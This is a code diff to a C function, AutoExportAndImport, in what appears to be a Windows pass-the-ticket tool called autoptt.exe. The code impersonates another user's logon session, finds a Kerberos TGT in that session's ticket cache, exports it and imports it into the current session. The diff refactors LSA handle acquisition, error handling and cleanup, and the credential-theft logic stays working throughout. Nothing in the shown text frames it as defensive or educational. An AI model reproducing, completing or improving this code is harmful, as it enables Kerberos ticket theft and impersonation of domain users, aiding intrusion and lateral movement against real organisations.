@@ -1626,7 +1626,6 @@ void AutoExportAndImport() {
     HMODULE h = LoadLibraryA("secur32.dll");
     PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
     PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
-    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
     PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
     PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
     PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");
@@ -1658,9 +1657,9 @@ void AutoExportAndImport() {
         return;
     }
 
-    HANDLE lsa = NULL;
-    if (con_fn(&lsa) != 0) {
-        PrintError("LsaConnectUntrusted failed");
+    HANDLE lsaHandle = GetLsaHandle(TRUE);
+    if (!lsaHandle) {
+        PrintError("Failed to get LSA handle");
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -1673,20 +1672,19 @@ void AutoExportAndImport() {
     pkg.MaximumLength = 9;
 
     ULONG auth = 0;
-    if (lkp_fn(lsa, &pkg, &auth) != 0) {
+    if (lkp_fn(lsaHandle, &pkg, &auth) != 0) {
         PrintError("Failed to find Kerberos package");
-        LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    HANDLE hImpTokenCache = NULL;
-    BOOL needRevertCache = FALSE;
+    HANDLE hImpToken = NULL;
+    BOOL needRevert = FALSE;
 
-    if (ImpersonateSession(targetLogonId, &hImpTokenCache)) {
-        if (ImpersonateLoggedOnUser(hImpTokenCache)) {
-            needRevertCache = TRUE;
+    if (ImpersonateSession(targetLogonId, &hImpToken)) {
+        if (ImpersonateLoggedOnUser(hImpToken)) {
+            needRevert = TRUE;
         }
     }
 
@@ -1699,31 +1697,20 @@ void AutoExportAndImport() {
     ULONG sz = 0;
     NTSTATUS sub = 0;
 
-    NTSTATUS cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);
-
-    if (needRevertCache) {
-        RevertToSelf();
-        CloseHandle(hImpTokenCache);
-    }
-
-    if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
-        if (!cacheRsp) {
-            cacheReq.LogonId.LowPart = targetLuid.LowPart;
-            cacheReq.LogonId.HighPart = targetLuid.HighPart;
-            cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);
+    if (cal_fn(lsaHandle, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
+        printf("Error: Failed to get ticket cache for LogonId 0x%lx\n", targetLogonId);
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
         }
-
-        if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
-            PrintError("Failed to get ticket cache");
-            LsaDeregisterLogonProcess(lsa);
-            fre_fn(session_list);
-            FreeLibrary(h);
-            return;
-        }
+        fre_fn(session_list);
+        FreeLibrary(h);
+        return;
     }
 
     BOOL found = FALSE;
     wchar_t targetSrv[512] = { 0 };
+    ULONG ticketFlags = 0;
 
     for (ULONG i = 0; i < cacheRsp->CountOfTickets; i++) {
         KERB_TICKET_CACHE_INFO* t = &cacheRsp->Tickets[i];
@@ -1740,92 +1727,95 @@ void AutoExportAndImport() {
             found = TRUE;
             wcsncpy(targetSrv, srv, 511);
             targetSrv[511] = L'\0';
+            ticketFlags = t->TicketFlags;
             break;
         }
     }
 
+    fre_fn(cacheRsp);
+
     if (!found) {
         PrintError("TGT not found in cache");
-        fre_fn(cacheRsp);
-        LsaDeregisterLogonProcess(lsa);
-        fre_fn(session_list);
-        FreeLibrary(h);
-        return;
-    }
-
-    HANDLE hImpToken = NULL;
-    BOOL needRevert = FALSE;
-
-    if (ImpersonateSession(targetLogonId, &hImpToken)) {
-        if (ImpersonateLoggedOnUser(hImpToken)) {
-            needRevert = TRUE;
-        }
-    }
-
-    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
-    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
-
-    if (!retReq) {
-        PrintError("Memory allocation failed");
-        fre_fn(cacheRsp);
         if (needRevert) {
             RevertToSelf();
             CloseHandle(hImpToken);
         }
-        LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    ZeroMemory(retReq, reqSize);
-    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
-    retReq->LogonId.LowPart = 0;
-    retReq->LogonId.HighPart = 0;
-    retReq->TicketFlags = 0;
-    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
-    retReq->EncryptionType = 0;
-    retReq->TargetName.Length = (USHORT)(wcslen(targetSrv) * sizeof(WCHAR));
-    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
-    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-    memcpy(retReq->TargetName.Buffer, targetSrv, retReq->TargetName.Length);
+    size_t targetNameLen = wcslen(targetSrv);
+    LSA_UNICODE_STRING tName;
+    tName.Length = (USHORT)(targetNameLen * sizeof(WCHAR));
+    tName.MaximumLength = tName.Length + sizeof(WCHAR);
+    tName.Buffer = (PWSTR)targetSrv;
 
-    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
-    ULONG retSz = 0;
-    sub = 0;
+    size_t structSize = sizeof(MY_KERB_RETRIEVE_TKT_REQUEST);
+    size_t totalSize = structSize + tName.MaximumLength;
 
-    NTSTATUS retStatus = cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub);
+    PVOID unmanagedAddr = LocalAlloc(LPTR, totalSize);
+    if (!unmanagedAddr) {
+        PrintError("Memory allocation failed");
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
+        }
+        fre_fn(session_list);
+        FreeLibrary(h);
+        return;
+    }
 
-    free(retReq);
+    MY_KERB_RETRIEVE_TKT_REQUEST* pRequest = (MY_KERB_RETRIEVE_TKT_REQUEST*)unmanagedAddr;
+    pRequest->MessageType = MY_KerbRetrieveEncodedTicketMessage;
+    pRequest->LogonId.LowPart = 0;
+    pRequest->LogonId.HighPart = 0;
+    pRequest->TargetName = tName;
+    pRequest->TicketFlags = ticketFlags;
+    pRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+    pRequest->EncryptionType = 0;
+    pRequest->CredentialsHandle.LowPart = NULL;
+    pRequest->CredentialsHandle.HighPart = NULL;
+
+    PVOID newTargetNameBuffPtr = (PVOID)((BYTE*)unmanagedAddr + structSize);
+    memcpy(newTargetNameBuffPtr, tName.Buffer, tName.MaximumLength);
+    pRequest->TargetName.Buffer = (PWSTR)newTargetNameBuffPtr;
+
+    PVOID responsePtr = NULL;
+    ULONG responseSize = 0;
+    NTSTATUS protocolStatus = 0;
+
+    NTSTATUS status = cal_fn(lsaHandle, auth, unmanagedAddr, (ULONG)totalSize, &responsePtr, &responseSize, &protocolStatus);
+
+    LocalFree(unmanagedAddr);
 
     if (needRevert) {
         RevertToSelf();
         CloseHandle(hImpToken);
     }
 
-    if (retStatus != 0 || sub != 0) {
+    if (status != 0 || protocolStatus != 0 || !responsePtr || responseSize == 0) {
         printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
-            (unsigned long)retStatus, (unsigned long)sub);
-        fre_fn(cacheRsp);
-        LsaDeregisterLogonProcess(lsa);
+            (unsigned long)status, (unsigned long)protocolStatus);
+        if (responsePtr) fre_fn(responsePtr);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
+    MY_KERB_RETRIEVE_TKT_RESPONSE* pResponse = (MY_KERB_RETRIEVE_TKT_RESPONSE*)responsePtr;
+
     PrintSuccess("Ticket retrieved successfully");
-    printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);
+    printf("    Size: %lu bytes\n", (unsigned long)pResponse->Ticket.EncodedTicketSize);
 
     printf("\n[*] Importing ticket into current session...\n");
 
-    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + retRsp->Ticket.EncodedTicketSize;
+    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + pResponse->Ticket.EncodedTicketSize;
     PKERB_SUBMIT_TKT_REQUEST submitReq = (PKERB_SUBMIT_TKT_REQUEST)malloc(submitSize);
 
     if (!submitReq) {
         PrintError("Memory allocation failed");
-        fre_fn(retRsp);
-        fre_fn(cacheRsp);
-        LsaDeregisterLogonProcess(lsa);
+        fre_fn(responsePtr);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -1836,18 +1826,18 @@ void AutoExportAndImport() {
     submitReq->LogonId.LowPart = 0;
     submitReq->LogonId.HighPart = 0;
     submitReq->Flags = 0;
-    submitReq->KerbCredSize = retRsp->Ticket.EncodedTicketSize;
+    submitReq->KerbCredSize = pResponse->Ticket.EncodedTicketSize;
     submitReq->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
 
     memcpy((PBYTE)submitReq + sizeof(KERB_SUBMIT_TKT_REQUEST),
-        retRsp->Ticket.EncodedTicket,
-        retRsp->Ticket.EncodedTicketSize);
+        pResponse->Ticket.EncodedTicket,
+        pResponse->Ticket.EncodedTicketSize);
 
     PVOID response = NULL;
     ULONG responseSz = 0;
     NTSTATUS submitSub = 0;
 
-    NTSTATUS status = cal_fn(lsa, auth, submitReq, submitSize, &response, &responseSz, &submitSub);
+    status = cal_fn(lsaHandle, auth, submitReq, submitSize, &response, &responseSz, &submitSub);
 
     free(submitReq);
 
@@ -1866,9 +1856,7 @@ void AutoExportAndImport() {
         }
 
         if (response) fre_fn(response);
-        fre_fn(retRsp);
-        fre_fn(cacheRsp);
-        LsaDeregisterLogonProcess(lsa);
+        fre_fn(responsePtr);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -1884,9 +1872,7 @@ void AutoExportAndImport() {
     printf("    You can verify with: autoptt.exe klist\n");
 
     if (response) fre_fn(response);
-    fre_fn(retRsp);
-    fre_fn(cacheRsp);
-    LsaDeregisterLogonProcess(lsa);
+    fre_fn(responsePtr);
     fre_fn(session_list);
     FreeLibrary(h);
 }
